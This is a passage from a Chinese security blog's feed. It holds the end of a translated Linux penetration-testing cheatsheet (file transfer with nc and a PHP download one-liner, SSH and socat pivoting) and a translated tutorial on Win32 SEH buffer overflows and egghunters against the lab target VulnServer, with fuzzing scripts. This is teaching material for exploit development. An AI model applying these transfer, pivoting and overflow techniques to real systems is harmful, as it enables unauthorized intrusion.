FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python -m pyftpdlib -p 21 -w</span><br></pre></td></tr></table></figure><h2 id="5-5-TFTP"><a href="#5-5-TFTP" class="headerlink" title="5.5 TFTP"></a>5.5 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service atftpd start</span><br><span class="line">atftpd --daemon --port 69 /tftp</span><br><span class="line">/etc/init.d/atftpd restart</span><br><span class="line">auxiliary/server/tftp</span><br></pre></td></tr></table></figure><h2 id="5-6-NC-Listeners"><a href="#5-6-NC-Listeners" class="headerlink" title="5.6 NC Listeners"></a>5.6 NC Listeners</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443 &lt; filetotransfer.txt</span><br><span class="line">nc &lt;ip&gt; 443 &gt; filetransfer.txt</span><br></pre></td></tr></table></figure><h2 id="5-7-PHP-File-Transfers"><a href="#5-7-PHP-File-Transfers" class="headerlink" title="5.7 PHP File Transfers"></a>5.7 PHP File Transfers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php file_put_contents(&apos;nameOfFile&apos;, fopen(&apos;http://192.168.1.102/file&apos;, &apos;r&apos;)); ?&gt;&quot; &gt; down2.php</span><br></pre></td></tr></table></figure><h2 id="5-8-SCP"><a href="#5-8-SCP" class="headerlink" title="5.8 SCP"></a>5.8 SCP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Copy a file:</span><br><span class="line">scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext</span><br><span class="line"></span><br><span class="line"># Copy a directory:</span><br><span class="line">scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination</span><br></pre></td></tr></table></figure><h1 id="0x06-横向渗透"><a href="#0x06-横向渗透" class="headerlink" title="0x06 横向渗透"></a>0x06 横向渗透</h1><h2 id="6-1-SSH本地端口转发"><a href="#6-1-SSH本地端口转发" class="headerlink" title="6.1 SSH本地端口转发"></a>6.1 SSH本地端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;user&gt;@&lt;target&gt; -L 127.0.0.1:8888:&lt;targetip&gt;:&lt;targetport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-SSH动态端口转发"><a href="#6-2-SSH动态端口转发" class="headerlink" title="6.2 SSH动态端口转发"></a>6.2 SSH动态端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -D &lt;localport&gt; user@host</span><br><span class="line">nano /etc/proxychains.conf</span><br><span class="line">127.0.0.1 &lt;localport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-3-索卡特港口前进"><a href="#6-3-索卡特港口前进" class="headerlink" title="6.3 索卡特港口前进"></a>6.3 索卡特港口前进</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat tcp-listen:5000,reuseaddr,fork tcp:&lt;target ip&gt;:5001</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Win32缓冲区溢出-SEH溢出和Egghunters</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Win32%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-SEH%E6%BA%A2%E5%87%BA%E5%92%8CEgghunters/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/</id>
    <published>2019-10-11T03:29:57.000Z</published>
    <updated>2019-10-11T07:03:22.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一篇翻译的文章，出自<a href="https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。" target="_blank" rel="noopener">https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。</a></p><a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><h2 id="1-1-异常处理程序101"><a href="#1-1-异常处理程序101" class="headerlink" title="1.1 异常处理程序101"></a>1.1 异常处理程序101</h2><p>在从漏洞利用的角度出发进行研究之前，让我们首先讨论一下<strong>异常处理程序的</strong> <em>真正</em>含义，不同的类型以及它们在Windows OS中的服务目的。</p><h3 id="1-1-1-什么是例外？"><a href="#1-1-1-什么是例外？" class="headerlink" title="1.1.1 什么是例外？"></a>1.1.1 什么是例外？</h3><p><em>异常是在程序/功能执行期间发生的事件</em></p><h3 id="1-1-2-不同类型的处理程序"><a href="#1-1-2-不同类型的处理程序" class="headerlink" title="1.1.2 不同类型的处理程序"></a>1.1.2 不同类型的处理程序</h3><p><strong>异常处理程序（EH）</strong> -一段代码，将尝试<em>执行某项操作，</em>并根据结果选择预定义的课程。例如，如果失败，请尝试执行此操作。</p><p><strong>结构化异常处理程序（SEH）-</strong> Windows内置的异常处理程序，如果开发特定的异常处理程序失败或主要使用，则可用于回退。</p><p><strong>下一个结构化异常处理程序（nSEH）-</strong></p><p>现在，如您在上面看到的，我<strong>确实</strong>提到了<strong>EH / SEH，</strong>因为<strong>异常处理程序</strong>分为两个不同的类别，即<em>OS级别</em>处理程序和/或由开发人员自己实现的处理程序。如您所见，Windows具有一个称为<strong>SEH</strong>的<em>操作系统级别</em>。</p><p>因此，基本上，<strong>异常处理程序</strong>是程序内部编写的代码段，其唯一目的是处理应用程序可能引发的任何<em>异常</em>或错误。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    // Code to try goes here.</span><br><span class="line">&#125;</span><br><span class="line">catch (SomeSpecificException ex)</span><br><span class="line">&#123;</span><br><span class="line">    // Code to handle the exception goes here.</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">    // Code to execute after the try (and possibly catch) blocks </span><br><span class="line">    // goes here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子代表了一个基本的异常处理程序<strong>（EH）</strong>在<code>C#</code>由开发人员实现-有时候看着像上面的代码可以是相当吓人非程序员，但所有我们真正做的是说<code>try</code>运行这段代码：如果有错误/无论<code>catch</code>块包含什么内容，都将发生异常。简单！</p><p>现在，对于软件开发人员来说，编写自己的异常处理程序来管理软件可能遇到的任何错误/警告并不少见，但是<strong>Windows</strong>还内置了一个称为<strong>结构化异常处理程序（SEH）的程序</strong>，它可以抛出诸如以下的错误消息<code>Program.exe has stopped working and needs to close</code>：确保您之前都看过它们。</p><p>还值得一提的是，无论在<strong>OS级别</strong>和/或<strong>开发人员级别</strong>定义了<strong>异常处理**</strong>程序<strong>，</strong>Windows SEH都会<strong>通过一组指定的内存位置和<em>功能</em>对所有</strong>处理程序<strong>进行集中和一致的控制和管理，无论是在</strong>操作系统级别<strong>和/或</strong>开发人员级别。**。</p><h3 id="1-1-3-那么结构化异常处理程序如何工作？"><a href="#1-1-3-那么结构化异常处理程序如何工作？" class="headerlink" title="1.1.3 那么结构化异常处理程序如何工作？"></a>1.1.3 那么结构化异常处理程序如何工作？</h3><p>那么，它们如何工作？SEH井是Windows中的一种机制，它利用称为<strong>链接列表</strong>的数据结构/布局来包含一系列存储位置。触发异常后，操作系统将检索<strong>SEH链</strong>的头部并遍历列表，处理程序将评估最相关的操作过程，以正常关闭程序或执行指定的操作以从<em>异常中</em>恢复。（更多有关链接的信息）</p><p>当我们运行一个应用程序时，将执行该应用程序，并从<em>该应用程序</em>内部运行每个<strong>功能</strong>，都会创建一个<strong>堆栈帧</strong>，然后在该函数<em>返回</em>或完成执行后最终<strong>弹出</strong>该<strong>堆栈帧</strong>。现在对于<strong>异常处理程序</strong>实际上同样如此。基本上，如果你运行一个函数具有<strong>异常处理程序</strong>嵌入itself-该异常处理程序将获得它自己的专用<strong>堆栈帧</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114152.png" class="lozad"></p><p><em>资料来源：ethicalhacker.net</em></p><p>如您所见，每个<strong>代码块</strong>都有自己的<strong>堆栈框架</strong>，由链接每个相应<em>框架</em>的箭头表示。</p><p>那么……它们是如何联系的？对每个<strong>异常处理程序来说</strong>，都有一个配置的<strong>异常注册记录</strong>，这些<strong>记录</strong>都链接在一起形成一个链表。该<strong>异常注册记录</strong>中包含众多领域，但即<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>它定义的下一个<strong>异常注册记录</strong>在<strong>SEH链</strong> -这是什么使我们过导航<strong>SEH链</strong>从<em>顶部至底部</em>。</p><p>现在，您可能想知道<strong>Windows SEH</strong>如何使用<strong>异常注册记录</strong>和<strong>处理程序</strong>等。当发生异常时，操作系统将从<strong>SEH链</strong>的顶部启动，并检查第一个<strong>异常注册记录</strong>以查看它是否可以处理异常/错误，如果可以，它将执行指向<strong>异常处理程序</strong>的指针定义的代码块-但是，如果不能，它将使用字段移至下<strong>一条*</strong>记录，<em>并沿*</em>SEH链*<em>向下<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>移动，并继续执行因此一直沿链向下，直到找到能够处理异常的</em>记录/处理程序*。</p><p>但是，如果没有预定义的异常处理程序功能适用，该怎么办？良好的窗口在每个<strong>SEH链</strong>的底部放置了一个默认/通用异常处理程序，它可以提供如下通用消息<code>Your program has stopped responding and needs to close</code>：通用处理程序在上图中由表示<code>0xffffff</code></p><p>下图提供了整个<strong>SEH链</strong>的简化概述</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114241.png" class="lozad"></p><p>我们还可以通过加载二进制文件并<strong>单击</strong>来查看具有<strong>免疫性</strong>的<strong>SEH链</strong><code>Alt+S</code> -如您在下图中所看到的，我们的<strong>SEH链</strong>在左下角以绿色突出显示，而<strong>SEH Record / SEH Handler</strong>在屏幕上以蓝色突出显示。堆。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114253.png" class="lozad"></p><p>在这种情况下，我们实际上有2个由<strong>SEH Records</strong>指定的处理程序-第一个是正常实现的处理程序，而第二个是地址<code>0028FFC4</code>的Window的<strong>OS Level</strong>处理程序，我们可以在下面的屏幕快照中看到。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114313.png" class="lozad"></p><h3 id="1-1-4-漏洞"><a href="#1-1-4-漏洞" class="headerlink" title="1.1.4 漏洞"></a>1.1.4 漏洞</h3><p>因此，回顾一下，我们已经介绍了异常是什么，不同类型的处理程序，还讨论了<strong>结构化异常处理程序的</strong> <em>真正</em>工作原理，因此现在我们可能应该从攻击者的角度谈谈这一点以及我们如何利用这些<strong>异常处理程序。</strong>处理程序来获得对程序执行流程的控制，类似于<code>EIP Overwrite</code>第1部分中的内容。</p><p>现在在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">这里的</a>第1部分中-我们能够控制VulnServer和SLMail上的<em>执行流程</em>，从而也将它重定向到我们自己的<em>shellcode</em>并弹出一个反向shell，这当然是一个非常古老的漏洞，SEH应该解决此问题，但是一个非常糟糕的实现，很快就被利用了。</p><p>现在，我不想在这里展示一个疯狂的示例，因为我将在下面的“ <strong>示例”</strong>部分中进行介绍，但是这里的理论是我们不使用用户控制输入覆盖EIP，而是覆盖指向<strong>下一个SEH记录</strong>（即<strong>异常注册）</strong>的指针<strong>记录</strong>以及指向<strong>SE处理程序</strong>的指针，这些指针指向我们控制并可以放置shellcode的内存区域。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114327.png" class="lozad"></p><p>如您所见，我们没有像第1 部分那样覆盖<strong>EIP寄存器</strong>，<code>41414141</code>而是覆盖了<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针。现在，在开始讨论Egghunter以及进行<em>SEH溢出</em>时如何使用它们之前，我想快速向您展示与<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针相比，我们如何控制<strong>EIP寄存器</strong>。</p><p>我不会深入探讨细节，但是如果我们可以对永不重复的字符串进行<em>模糊处理</em>，然后计算偏移量，然后使用选择的数据覆盖<strong>SE Handler</strong>和<strong>SE Record</strong>，该偏移量可用于控制EIP。</p><p>在下面的示例中，我分析了偏移也是<strong>SE Record</strong>，<code>3519 Bytes</code>因此我在<strong>SE Record上</strong>加上了4 x B ，在<strong>SE Handler上</strong>加上了4 <strong>xC</strong>。查看下面的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;BBBB&quot; </span><br><span class="line">seh = &quot;CCCC&quot;</span><br><span class="line"></span><br><span class="line">buffer=&quot;A&quot; * 3515</span><br><span class="line">buffer += nseh</span><br><span class="line">buffer += seh</span><br><span class="line"></span><br><span class="line">junk = &quot;D&quot;*(4500-len(buffer))</span><br><span class="line">buffer += junk</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">print &quot;[*] Finished Fuzzing Check SEH Chain on Immunity&quot;</span><br><span class="line">s.close()</span><br><span class="line">except:</span><br><span class="line">print &quot;couldn&apos;t connect to server&quot;</span><br></pre></td></tr></table></figure><p>现在，如果我们跳过<strong>Immunity</strong>并查看<strong>SEH链，</strong>我们将看到以下内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114343.png" class="lozad"></p><p>首先让我向您展示一些东西，当前应用程序处于崩溃状态（当然），但是我们仍然可以通过按<strong>Shift + F9</strong>将异常传递给程序-如果这样做，我们会注意到一些有趣的东西。</p><p><strong>SE Handler</strong>在堆栈上的值被压入<strong>EIP寄存器</strong> ，这当然不是很理想！现在，我们可以控制整个程序的执行流程。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114352.png" class="lozad"></p><h3 id="1-1-5-提及POP-POP-RET"><a href="#1-1-5-提及POP-POP-RET" class="headerlink" title="1.1.5 提及POP POP RET"></a>1.1.5 提及POP POP RET</h3><p>因此，如您在上面的屏幕截图/示例中所看到的，我们实际上生活在<strong>SE Handler</strong>的土地或区域中，由于空间的限制以及我们必须使用的存储区域的小巧性，我们实际上并不好当然，我们也许可以将Egghunters纳入其中，但我将在本文后面讨论。我想首先谈谈<code>POP POP RET</code>通常与<strong>SEH溢出</strong>结合使用的技术<strong>。</strong></p><h4 id="1-1-5-1-什么是POP-POP-RET？"><a href="#1-1-5-1-什么是POP-POP-RET？" class="headerlink" title="1.1.5.1 什么是POP POP RET？"></a><strong>1.1.5.1 什么是POP POP RET？</strong></h4><p>现在，实际上，<code>POP POP RET</code>我们将<strong>SE Handler</strong>值替换为一条<code>POP POP RET</code>指令的内存地址，这将听起来很真实，这将在技术上运行这些汇编指令，从而将我们<strong>引向nSEH。</strong></p><p>值得一提的是，<em>弹出</em>值转到的寄存器并不重要，我们只需要将<strong>ESP</strong> 的值上移<em>两次</em>，然后返回即可执行。因此<em>POP EAX</em>，<em>POP EBC，POP ECX</em>等都将适用，只要<code>RET</code>在两次<em>弹出</em>后有相关说明</p><h4 id="1-1-5-2-我们为什么要POP-POP-RET？"><a href="#1-1-5-2-我们为什么要POP-POP-RET？" class="headerlink" title="1.1.5.2 我们为什么要POP POP RET？"></a>1.1.5.2 我们为什么要POP POP RET？</h4><p>现在，如果您回想<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a> -一旦我们获得了对<strong>返回地址</strong>和<strong>EIP的</strong>控制，我们就找到了一条<strong>JMP ESP</strong>指令，以跳到我们的堆栈代码的顶部，在此我们的shell代码和NOP滑动，我们获得了代码执行权。现在，如果我们尝试向<strong>SE Handler中</strong>添加<strong>JMP ESP</strong>指令的内存位置，则Windows会自动将所有寄存器清零，以防止用户跳到那里的shellcode，但这确实是一个有缺陷的保护机制。</p><p>您实际上可以在下面的屏幕中看到<strong>ESI</strong>和<strong>EDI</strong>已被清零，以帮助减轻攻击者直接跳到Shellcode的风险。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114508.png" class="lozad"></p><p>现在就在这里<code>POP POP RET</code>，让我们首先记住一下<strong>SEH Record</strong>＆<strong>Handler</strong>在堆栈上的布局</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114516.png" class="lozad"></p><p>现在，让我们考虑一下<strong>POP POP RET</strong>在这里将执行的操作：<em>POP（向上移动4个字节）<em>，</em>POP（向上移动4个字节）<em>和</em>RET（简单返回，将地址发送给EIP作为下一条要执行的指令）</em> -现在我们有了完全控制权； ）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114527.png" class="lozad"></p><h4 id="1-1-5-3-查找POP-POP-RET模块和说明"><a href="#1-1-5-3-查找POP-POP-RET模块和说明" class="headerlink" title="1.1.5.3 查找POP POP RET模块和说明"></a>1.1.5.3 查找POP POP RET模块和说明</h4><p>现在，我不想在这里深入探讨如何找到适用的模块和说明，因为我将在示例部分中介绍它，但长话短说是<strong>mona</strong></p><p>与<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a>类似，我们大量使用了<strong>mona</strong>，在执行<strong>SEH溢出</strong>时也将使用它-我们要做的就是发出以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>这将自动在所有可用模块中搜索<code>POP POP RET</code>序列。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114536.png" class="lozad"></p><p>现在，就像漏洞利用一样，我们必须确保我们选择内存地址中具有0个错误字符的模块，并避免使用诸如<strong>SEEPSEH之类的*</strong>SEH防护措施*，我将在后面讨论。</p><hr><h2 id="1-2-彩蛋猎人101"><a href="#1-2-彩蛋猎人101" class="headerlink" title="1.2 彩蛋猎人101"></a>1.2 彩蛋猎人101</h2><h3 id="1-2-1-什么是彩蛋猎人？"><a href="#1-2-1-什么是彩蛋猎人？" class="headerlink" title="1.2.1 什么是彩蛋猎人？"></a>1.2.1 什么是彩蛋猎人？</h3><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><h3 id="1-2-2-彩蛋者如何工作？"><a href="#1-2-2-彩蛋者如何工作？" class="headerlink" title="1.2.2 彩蛋者如何工作？"></a>1.2.2 彩蛋者如何工作？</h3><p><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf</a></p><p>我想概述一下Egghunters在这里的工作方式，而无需深入了解，就像我上面已经说过的那样</p><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><p>这听起来不错，但为什么不仅仅使用简单的<strong>Short JMP</strong>或<strong>JMP ESP</strong>跳转到我们的shellcode- 想象一下您有很少的空间可以使用，例如<strong>50字节</strong>。这没有足够的空间来放置一些shell代码，但是足以放置一个<strong>32字节的Egghunter</strong></p><p>假设我们可以将<strong>32字节的</strong> hunter放入堆栈/内存，并且能够将执行重定向到hunter的位置，我们可以告诉hunter在整个内存空间中搜索预定义的标签，例如<code>MOCH</code>，我们的shellcode将是直接放在此标签（又称<strong>鸡蛋）之后</strong></p><p>所以执行流程看起来像这样</p><ol><li>控制执行力</li><li>跳转到包含<strong>32字节Egghunter的</strong>小缓冲区空间</li><li>Egghunter执行并在所有内存中搜索<strong>预定义的鸡蛋</strong></li><li>Egghunter找到<strong>鸡蛋</strong>并执行放置<em>在</em> <strong>鸡蛋*</strong>之后的* shellcode</li></ol><h3 id="1-2-3-一个关于NTDisplayString的词"><a href="#1-2-3-一个关于NTDisplayString的词" class="headerlink" title="1.2.3 一个关于NTDisplayString的词"></a>1.2.3 一个关于NTDisplayString的词</h3><p>在本文中，我们将使用<strong>32字节</strong> Egghunter，它利用<code>NTDisplayString</code>显示为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI </span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"></span><br><span class="line">NtDisplayString(</span><br><span class="line"></span><br><span class="line">  IN PUNICODE_STRING      String );</span><br></pre></td></tr></table></figure><p>[参考] [<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]" target="_blank" rel="noopener">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]</a></p><p><code>NTDisplayString</code>实际上是在Windows中使用相同的系统调用来显示蓝屏，那么这如何在我们的<strong>Egghunter中</strong>发挥<strong>作用？</strong></p><p>好吧，我们滥用了以下事实：该系统调用用于验证地址范围，并且指针也被读取而不被写入。</p><p>这种方法有一个小的缺点，它的系统调用号<code>NTDisplayString</code>无法更改，而且多年来，系统调用号在Windows版本和体系结构上均已更改。</p><p>当我写这篇文章时，我实际上遇到了我的Egghunter出现的一些问题，<code>Access Violation reading: FFFFFF</code>即执行<code>INT 2E</code>系统调用时。原因？</p><p>因为我试图在Windows的64位系统上运行Egghunter，所以我有点愚蠢，但是由于该应用程序被编译为32位应用程序并且过去没有太多问题，因此我对此没有多加考虑。</p><p>Corelan出色地解释了Egghunter的每个组装指令的功能，因此请查看此处的文章<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">。</a></p><hr><h1 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h1><h2 id="2-1-带Egghunter的VulnServer"><a href="#2-1-带Egghunter的VulnServer" class="headerlink" title="2.1 带Egghunter的VulnServer"></a>2.1 带Egghunter的VulnServer</h2><p>在此示例中，我将介绍<strong>VulnServer</strong>，这是一个故意易受攻击的服务器，它在端口9999上侦听任何传入的连接，并支持多种类型的命令，如之前在第1部分中看到的。</p><h3 id="2-1-1-模糊和发现崩溃"><a href="#2-1-1-模糊和发现崩溃" class="headerlink" title="2.1.1 模糊和发现崩溃"></a>2.1.1 模糊和发现崩溃</h3><p>现在类似于<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分，</a>我不想演示如何模糊<strong>VulnServer</strong>上的每个可用命令。如果您正在寻找类似的内容，请检查我们的<strong>booFuzz，</strong>它非常酷。在这种情况下，我只打算模糊<code>GMON</code>命令以节省时间并专注于开发部分本身。</p><p>让我们使用以下脚本对该命令进行简单的模糊处理来开始它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line"></span><br><span class="line">while len(buffer) &lt;= 30:</span><br><span class="line">buffer.append(&quot;A&quot;*counter)</span><br><span class="line">counter=counter+200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + string))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(string)</span><br></pre></td></tr></table></figure><p>我们在这里所做的工作与第1部分中介绍的基本堆栈溢出非常相似，其中我们在进行以下操作</p><ol><li>在<strong>端口9999</strong>上连接到<strong>bof.local</strong></li><li>发送<code>GMON /.:/ + string += 200</code>-其中字符串=，<code>A</code>并按<code>200</code>每个周期递增。</li><li>关闭TCP连接</li></ol><p>一旦应用程序崩溃，脚本将开始运行，我们可以检查<strong>Immunity</strong>。</p><p>现在，当我们跳到Immunity时，我们可能会注意到一些有趣的东西，我注意到的第一件事就是<code>Access Violation when writing to [06500000]</code>Immunity的页脚，这是告诉我们该应用程序处于崩溃状态，并且实际上不知道下一步该<em>怎么做</em> -您可能还要注意，与包含第1部分的<strong>EIP</strong>值不同，它看起来很正常<code>41414141</code>-这是由于我们没有过度运行返回地址并获得对<strong>EIP寄存器的</strong>控制，而是超过了堆栈上的<strong>nSEH</strong>和<strong>SEH</strong>值。</p><p>让我们通过在Immunity中按下来建立<strong>SEH链</strong><code>ALT+S</code>。这样做之后，我们会注意到一些有趣的<code>41414141</code>输出，我们过去在<strong>EIP寄存器中</strong>看到的输出现在显示在<strong>SE Handler中</strong>。右键单击<code>41414141</code>并选择<code>Follow in Stack</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114559.png" class="lozad"></p><p>完美，我们现在可以使用用户提供的输入来覆盖指向<strong>nSEH</strong>和<strong>SEH</strong>的指针。现在，让我们找出必须提供多少用户提供的输入才能到达<strong>nSEH</strong>和<strong>SEH</strong>的指针</p><h3 id="2-1-2-寻找偏移"><a href="#2-1-2-寻找偏移" class="headerlink" title="2.1.2 寻找偏移"></a>2.1.2 寻找偏移</h3><p>在这里，我们再次找到偏移量，因为我确信您知道这是漏洞利用开发的非常普遍的部分，并且不仅适用于<strong>SEH Overlows-</strong>有几种不同的方法可以执行此<em>操作</em>，例如<em>手动</em>，<strong>metasploit</strong>和<strong>mona，</strong>但是由于偏爱，我会在这里坚持<strong>蒙娜丽莎</strong>。</p><p>首先，使用以下命令创建一个永不重复的字符串/循环模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 